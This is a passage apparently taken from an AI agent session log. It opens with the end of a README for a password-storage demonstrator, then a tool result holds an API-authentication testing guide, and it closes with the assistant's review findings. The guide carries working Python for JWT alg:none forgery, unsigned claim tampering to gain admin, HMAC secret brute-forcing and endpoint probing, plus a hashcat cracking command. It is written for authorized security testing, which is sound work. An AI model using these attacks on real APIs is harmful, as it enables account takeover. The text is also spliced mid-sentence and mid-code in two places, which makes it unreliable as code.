exposed a real hole in the tests rather than a quirk of the harness:\n\n* the damaged-record timing branch is unreachable through the service, since the store rejects\n  such a line when loading, so it was only observable once timed directly against the verifier;\n* replacing the digest with a reversible encoding of the password slipped past checks that\n  searched the file's text, because the field is itself base64 - the test had to decode it first;\n* a \"lone surrogate is refused\" case was also too short to pass the length rule, so the length\n  rule was what the test had actually been checking.\n\nFixing them took the suite from 70 to 127 checks. Takeaway, if you reuse any of this: a passing\nmutation battery is evidence about your tests, and an empty-looking one tells you nothing.\n\n## Limits of this example\n\nIt is a demonstrator of safe password storage, not a production account system. Deliberately\nabsent: rate limiting and lockout after repeated failures, password reset and email\nverification, re-hashing when the round count is raised, sessions and tokens, and concurrency\nsafety (the store rewrites the whole file, so run one process at a time against it). Maps to OWASP API2:2023 Broken\n  Authentication. Activates for requests involving API authentication testing, token\n  validation assessment, credential security testing, or API auth bypass.\n\n  '\ndomain: cybersecurity\nsubdomain: api-security\ntags:\n- api-security\n- owasp\n- authentication\n- jwt\n- session-management\n- credential-security\nversion: 1.0.0\nauthor: mahipal\nlicense: Apache-2.0\nnist_csf:\n- PR.PS-01\n- ID.RA-01\n- PR.DS-10\n- DE.CM-01\nmitre_attack:\n- T1190\n- T1059.007\n- T1552.001\n- T1003\n- T1110\n---\n# Testing API Authentication Weaknesses\n\n## When to Use\n\n- Assessing REST API authentication mechanisms for bypass vulnerabilities before production deployment\n- Testing JWT token implementation for common weaknesses (none algorithm, key confusion, missing expiration)\n- Evaluating whether all API endpoints enforce authentication or if some are unintentionally exposed\n- Testing API key generation, storage, and rotation mechanisms for predictability or leakage\n- Validating session management including token expiration, revocation, and refresh token security\n\n**Do not use** without written authorization. Authentication testing involves attempting to bypass security controls.\n\n## Prerequisites\n\n- Written authorization specifying target API and authentication mechanisms in scope\n- Valid test credentials for at least two user roles (regular user, admin)\n- Burp Suite Professional with JWT-related extensions (JSON Web Tokens, JWT Editor)\n- Python 3.10+ with `requests`, `PyJWT`, and `jwt` libraries\n- Wordlists for credential testing (SecLists authentication wordlists)\n- API documentation or OpenAPI specification\n\n## Workflow\n\n### Step 1: Authentication Mechanism Identification\n\n```python\nimport requests\nimport json\n\nBASE_URL = \"https://target-api.example.com/api/v1\"\n\n# Probe the API to identify authentication mechanisms\nauth_indicators = {\n    \"jwt_bearer\": False,\n    \"api_key_header\": False,\n    \"api_key_query\": False,\n    \"basic_auth\": False,\n    \"oauth2\": False,\n    \"session_cookie\": False,\n    \"custom_token\": False,\n}\n\n# Test 1: Check unauthenticated access\nresp = requests.get(f\"{BASE_URL}/users/me\")\nprint(f\"Unauthenticated: {resp.status_code}\")\nif resp.status_code == 200:\n    print(\"[CRITICAL] Endpoint accessible without authentication\")\n\n# Test 2: Check WWW-Authenticate header\nif \"WWW-Authenticate\" in resp.headers:\n    scheme = resp.headers[\"WWW-Authenticate\"]\n    print(f\"Auth scheme advertised: {scheme}\")\n    if \"Bearer\" in scheme:\n        auth_indicators[\"jwt_bearer\"] = True\n    elif \"Basic\" in scheme:\n        auth_indicators[\"basic_auth\"] = True\n\n# Test 3: Login and examine tokens\nlogin_resp = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": \"testuser@example.com\", \"password\": \"TestPass123!\"})\n\nif login_resp.status_code == 200:\n    login_data = login_resp.json()\n    # Check for JWT tokens\n    for key in [\"token\", \"access_token\", \"jwt\", \"id_token\"]:\n        if key in login_data:\n            token = login_data[key]\n            if token.count('.') == 2:\n                auth_indicators[\"jwt_bearer\"] = True\n                print(f\"JWT found in response field: {key}\")\n    # Check for refresh tokens\n    for key in [\"refresh_token\", \"refresh\"]:\n        if key in login_data:\n            print(f\"Refresh token found in field: {key}\")\n    # Check for session cookies\n    for cookie in login_resp.cookies:\n        print(f\"Cookie set: {cookie.name} = {cookie.value[:20]}...\")\n        if \"session\" in cookie.name.lower():\n            auth_indicators[\"session_cookie\"] = True\n\nprint(f\"\\nAuthentication mechanisms detected: {[k for k,v in auth_indicators.items() if v]}\")\n```\n\n### Step 2: Unauthenticated Endpoint Discovery\n\n```python\n# Test all endpoints without authentication\nendpoints = [\n    (\"GET\", \"/users\"),\n    (\"GET\", \"/users/me\"),\n    (\"GET\", \"/users/1\"),\n    (\"GET\", \"/admin/users\"),\n    (\"GET\", \"/admin/settings\"),\n    (\"GET\", \"/health\"),\n    (\"GET\", \"/metrics\"),\n    (\"GET\", \"/debug\"),\n    (\"GET\", \"/actuator\"),\n    (\"GET\", \"/actuator/env\"),\n    (\"GET\", \"/swagger.json\"),\n    (\"GET\", \"/api-docs\"),\n    (\"GET\", \"/graphql\"),\n    (\"POST\", \"/graphql\"),\n    (\"GET\", \"/config\"),\n    (\"GET\", \"/internal/status\"),\n    (\"GET\", \"/.env\"),\n    (\"GET\", \"/status\"),\n    (\"GET\", \"/info\"),\n    (\"GET\", \"/version\"),\n]\n\nprint(\"Unauthenticated Endpoint Scan:\")\nfor method, path in endpoints:\n    try:\n        resp = requests.request(method, f\"{BASE_URL}{path}\", timeout=5)\n        if resp.status_code not in (401, 403):\n            content_preview = resp.text[:100] if resp.text else \"empty\"\n            print(f\"  [OPEN] {method} {path} -> {resp.status_code}: {content_preview}\")\n    except requests.exceptions.RequestException:\n        pass\n```\n\n### Step 3: JWT Token Analysis\n\n```python\nimport base64\nimport json\nimport hmac\nimport hashlib\n\ndef decode_jwt_parts(token):\n    \"\"\"Decode JWT header and payload without verification.\"\"\"\n    parts = token.split('.')\n    if len(parts) != 3:\n        return None, None\n\n    def pad_base64(s):\n        return s + '=' * (4 - len(s) % 4)\n\n    header = json.loads(base64.urlsafe_b64decode(pad_base64(parts[0])))\n    payload = json.loads(base64.urlsafe_b64decode(pad_base64(parts[1])))\n    return header, payload\n\n# Analyze the JWT token\ntoken = login_data.get(\"access_token\", \"\")\nheader, payload = decode_jwt_parts(token)\n\nprint(f\"JWT Header: {json.dumps(header, indent=2)}\")\nprint(f\"JWT Payload: {json.dumps(payload, indent=2)}\")\n\n# Security checks\nissues = []\n\n# Check 1: Algorithm\nif header.get(\"alg\") == \"none\":\n    issues.append(\"CRITICAL: Algorithm set to 'none' - token signature not verified\")\nif header.get(\"alg\") in (\"HS256\", \"HS384\", \"HS512\"):\n    issues.append(\"INFO: Symmetric algorithm used - check for weak/default secrets\")\n\n# Check 2: Expiration\nif \"exp\" not in payload:\n    issues.append(\"HIGH: No expiration claim (exp) - token never expires\")\nelse:\n    import time\n    exp_time = payload[\"exp\"]\n    ttl = exp_time - time.time()\n    if ttl > 86400:\n        issues.append(f\"MEDIUM: Token TTL is {ttl/3600:.0f} hours - excessively long\")\n\n# Check 3: Sensitive data in payload\nsensitive_fields = [\"password\", \"ssn\", \"credit_card\", \"secret\", \"private_key\"]\nfor field in sensitive_fields:\n    if field in payload:\n        issues.append(f\"HIGH: Sensitive field '{field}' in JWT payload\")\n\n# Check 4: Missing claims\nexpected_claims = [\"iss\", \"aud\", \"exp\", \"iat\", \"sub\"]\nmissing = [c for c in expected_claims if c not in payload]\nif missing:\n    issues.append(f\"MEDIUM: Missing standard claims: {missing}\")\n\n# Check 5: Key ID\nif \"kid\" in header:\n    kid = header[\"kid\"]\n    # Test for path traversal in kid\n    issues.append(f\"INFO: Key ID (kid) present: {kid} - test for injection\")\n\nfor issue in issues:\n    print(f\"  [{issue.split(':')[0]}] {issue}\")\n```\n\n### Step 4: JWT Manipulation Attacks\n\n```python\n# Attack 1: Remove signature (alg: none)\ndef forge_none_algorithm(token):\n    \"\"\"Create a token with alg:none to bypass signature verification.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    header['alg'] = 'none'\n    new_header = base64.urlsafe_b64encode(\n        json.dumps(header).encode()).decode().rstrip('=')\n    # Variations of the none algorithm\n    return [\n        f\"{new_header}.{parts[1]}.\",\n        f\"{new_header}.{parts[1]}.{parts[2]}\",\n        f\"{new_header}.{parts[1]}.e30\",\n    ]\n\n# Attack 2: Modify claims without re-signing\ndef forge_payload(token, modifications):\n    \"\"\"Modify payload claims and test if server validates signature.\"\"\"\n    parts = token.split('.')\n    payload = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))\n    payload_data.update(modifications)\n    new_payload = base64.urlsafe_b64encode(\n        json.dumps(payload_data).encode()).decode().rstrip('=')\n    return f\"{parts[0]}.{new_payload}.{parts[2]}\"\n\n# Attack 3: Brute force weak HMAC secrets\nCOMMON_JWT_SECRETS = [\n    \"secret\", \"password\", \"123456\", \"jwt_secret\", \"supersecret\",\n    \"key\", \"test\", \"admin\", \"changeme\", \"default\",\n    \"your-256-bit-secret\", \"my-secret-key\", \"jwt-secret\",\n    \"s3cr3t\", \"secret123\", \"mysecretkey\", \"apisecret\",\n]\n\ndef brute_force_jwt_secret(token):\n    \"\"\"Try common secrets against HMAC-signed JWTs.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    if header.get('alg') not in ('HS256', 'HS384', 'HS512'):\n        print(\"Not an HMAC token, skipping brute force\")\n        return None\n\n    signing_input = f\"{parts[0]}.{parts[1]}\".encode()\n    signature = parts[2]\n\n    hash_func = {\n        'HS256': hashlib.sha256,\n        'HS384': hashlib.sha384,\n        'HS512': hashlib.sha512\n    }[header['alg']]\n\n    for secret in COMMON_JWT_SECRETS:\n        expected_sig = base64.urlsafe_b64encode(\n            hmac.new(secret.encode(), signing_input, hash_func).digest()\n        ).decode().rstrip('=')\n        if expected_sig == signature:\n            print(f\"[CRITICAL] JWT secret found: '{secret}'\")\n            return secret\n\n    print(\"No common secrets matched - consider using hashcat/john for extended brute force\")\n    return None\n\n# Test all attacks\nnone_tokens = forge_none_algorithm(token)\nfor none_token in none_tokens:\n    resp = requests.get(f\"{BASE_URL}/users/me\",\n                       headers={\"Authorization\": f\"Bearer {none_token}\"})\n    if resp.status_code == 200:\n        print(f\"[CRITICAL] alg:none bypass successful\")\n\n# Test privilege escalation via claim modification\nadmin_token = forge_payload(token, {\"role\": \"admin\", \"is_admin\": True})\nresp = requests.get(f\"{BASE_URL}/admin/users\",\n                   headers={\"Authorization\": f\"Bearer {admin_token}\"})\nif resp.status_code == 200:\n    print(\"[CRITICAL] JWT claim modification accepted without signature validation\")\n\nbrute_force_jwt_secret(token)\n```\n\n### Step 5: Token Lifecycle Testing\n\n```python\n# Test 1: Token reuse after logout\nlogout_resp = requests.post(f\"{BASE_URL}/auth/logout\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nprint(f\"Logout: {logout_resp.status_code}\")\n\n# Try to use the token after logout\npost_logout_resp = requests.get(f\"{BASE_URL}/users/me\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nif post_logout_resp.status_code == 200:\n    print(\"[HIGH] Token still valid after logout - no server-side revocation\")\n\n# Test 2: Token reuse after password change\n# (requires changing password and then testing old token)\n\n# Test 3: Refresh token rotation\nrefresh_token = login_data.get(\"refresh_token\")\nif refresh_token:\n    # Use refresh token\n    refresh_resp = requests.post(f\"{BASE_URL}/auth/refresh\",\n        json={\"refresh_token\": refresh_token})\n    new_tokens = refresh_resp.json()\n\n    # Try to reuse the same refresh token (should fail if rotation is implemented)\n    reuse_resp = requests.post(f\"{BASE_URL}/auth/refresh\",\n        json={\"refresh_token\": refresh_token})\n    if reuse_resp.status_code == 200:\n        print(\"[HIGH] Refresh token reuse allowed - no rotation implemented\")\n\n# Test 4: Token in URL (leakage risk)\nresp = requests.get(f\"{BASE_URL}/users/me?token={token}\")\nif resp.status_code == 200:\n    print(\"[MEDIUM] Token accepted in query parameter - may leak in logs/referrer\")\n```\n\n### Step 6: Password Policy and Credential Testing\n\n```python\n# Test password policy enforcement on registration/change endpoints\nweak_passwords = [\n    \"a\",           # Too short\n    \"password\",    # Common password\n    \"12345678\",    # Numeric only\n    \"abcdefgh\",    # Alpha only, no complexity\n    \"Password1\",   # Meets basic complexity but is common\n    \"\",            # Empty\n    \" \",           # Whitespace\n]\n\nfor pwd in weak_passwords:\n    resp = requests.post(f\"{BASE_URL}/auth/register\",\n        json={\"email\": f\"test_{hash(pwd)%9999}@example.com\",\n              \"password\": pwd, \"name\": \"Test User\"})\n    if resp.status_code in (200, 201):\n        print(f\"[WEAK POLICY] Password accepted: '{pwd}'\")\n\n# Test account enumeration via login response differences\nvalid_email = \"testuser@example.com\"\ninvalid_email = \"nonexistent_user_xyz@example.com\"\n\nresp_valid = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": valid_email, \"password\": \"wrongpassword\"})\nresp_invalid = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": invalid_email, \"password\": \"wrongpassword\"})\n\nif resp_valid.text Authentication** | OWASP API2:2023 - weaknesses in authentication mechanisms that allow attackers to assume identities of legitimate users |\n| **JWT (JSON Web Token)** | Self-contained token format with header.payload.signature structure, used for stateless API authentication |\n| **Token Revocation** | Server-side mechanism to invalidate tokens before their expiration, critical for logout and password change |\n| **Credential Stuffing** | Automated attack using leaked username/password pairs against authentication endpoints |\n| **Account Enumeration** | Determining valid usernames through different error messages or response times for valid vs invalid accounts |\n| **Refresh Token Rotation** | Security practice where each use of a refresh token generates a new one, preventing token reuse attacks |\n\n## Tools & Systems\n\n- **Burp Suite JWT Editor**: Extension for decoding, editing, and re-signing JWT tokens with various attack modes\n- **jwt_tool**: Python tool for JWT testing with 12+ attack modes including alg:none, key confusion, and JWKS spoofing\n- **hashcat**: GPU-accelerated password cracker supporting JWT HMAC secret brute-forcing (mode 16500)\n- **Hydra**: Network login brute-forcer supporting HTTP form-based and API authentication testing\n- **Nuclei**: Template-based scanner with authentication bypass detection templates\n\n## Common Scenarios\n\n### Scenario: SaaS Platform API Authentication Assessment\n\n**Context**: A SaaS platform uses JWT tokens for API authentication. The JWT is issued upon login and used for all subsequent API calls. A refresh token mechanism is also implemented.\n\n**Approach**:\n1. Authenticate and capture the JWT: algorithm is HS256, expiration is 7 days, payload contains user role\n2. Test alg:none bypass: server rejects the token (secure)\n3. Brute force the HMAC secret: discover the secret is \"company-jwt-secret-2023\" (found using hashcat with custom wordlist)\n4. Forge a JWT with admin role using the discovered secret: gain admin access to all endpoints\n5. Test token revocation: tokens remain valid after logout and password change (no blacklist)\n6. Test refresh token: refresh token has no expiration and can be reused indefinitely\n7. Find that the password reset endpoint returns different messages for valid vs invalid emails\n8. Discover that the `/health` and `/metrics` endpoints are accessible without authentication\n\n**Pitfalls**:\n- Only testing the login endpoint and missing authentication weaknesses in password reset, MFA, and token refresh flows\n- Not checking if the JWT secret is the same across all environments (dev, staging, production)\n- Ignoring the token lifetime: a 7-day JWT with no revocation means a stolen token is valid for a week\n- Not testing for token leakage in server logs, URL parameters, or error messages\n\n## Output Format\n\n```\n## Finding: JWT HMAC Secret Brute-Forceable and Token Not Revocable\n\n**ID**: API-AUTH-001\n**Severity**: Critical (CVSS 9.1)\n**OWASP API**: API2:2023 - Broken Authentication\n**Affected Components**:\n  - POST /api/v1/auth/login (token issuance)\n  - All authenticated endpoints (token validation)\n  - POST /api/v1/auth/logout (ineffective)\n\n**Description**:\nThe API uses HS256-signed JWT tokens with a brute-forceable secret\n(\"company-jwt-secret-2023\"). An attacker who discovers this secret can\nforge tokens for any user with any role, including admin. Additionally,\ntokens are not revocable - logout does not invalidate the token server-side,\nand the 7-day expiration means stolen tokens remain valid for extended periods.\n\n**Attack Chain**:\n1. Capture any valid JWT from authenticated session\n2. Brute force the HMAC secret using hashcat: hashcat -a 0 -m 16500 jwt.txt wordlist.txt\n3. Secret recovered in 3 minutes: \"company-jwt-secret-2023\"\n4. Forge admin JWT: modify \"role\" claim to \"admin\", re-sign with discovered secret\n5. Access admin endpoints: GET /api/v1/admin/users returns all 50,000 user accounts\n\n**Remediation**:\n1. Replace HS256 with RS256 using a 2048-bit RSA key pair\n2. Use a cryptographically random secret of at least 256 bits if HMAC must be used\n3. Implement token blacklisting using Redis for logout and password change events\n4. Reduce token TTL to 15 minutes with refresh token rotation\n5. Add `iss` and `aud` claims validation to prevent token misuse across services\n```\n"}]}},{"type":"assistant","uuid":"0dd9f3e4-5cf7-4bec-b8eb-82c02aa64131","session_id":"f463b6b8-0275-4859-a0cb-6b9b382b1ced","parent_tool_use_id":null,"message":{"id":"0dd9f3e4-5cf7-4bec-b8eb-82c02aa64131","type":"message","role":"assistant","model":"vllm-general","content":[{"type":"text","text":"Confirmed the auth skill's applicable checks: Step 6 (password policy + account enumeration via response differences) and Key Concepts (credential stuffing, account enumeration). The core password-storage design is genuinely sound: per-account 16-byte `SecureRandom`\nsalt, a one-way salted derivation, `MessageDigest.isEqual` for comparison, key-derivation work\nspent on every refusal so that timing does not leak whether an account exists, `char[]`\npasswords that are wiped, and a store that refuses malformed records on load. 127 self-tests and\nan 18-mutant mutation battery back those claims.\n\nTen findings remain, none of which is a broken hash. A cluster of medium findings covers the KDF work factor sitting roughly half of\nthe current OWASP recommendation while `tryParse` still accepts records as thin as 1,000 rounds\n(SEC-03), a password policy that admits `Password1`-class secrets (SEC-04), file-permission\nnarrowing that fails **silently** (SEC-05), an unsynchronised whole-file rewrite that loses\nupdates and admits a registration TOCTOU (SEC-06), and credential material printed to stdout\n(SEC-07).
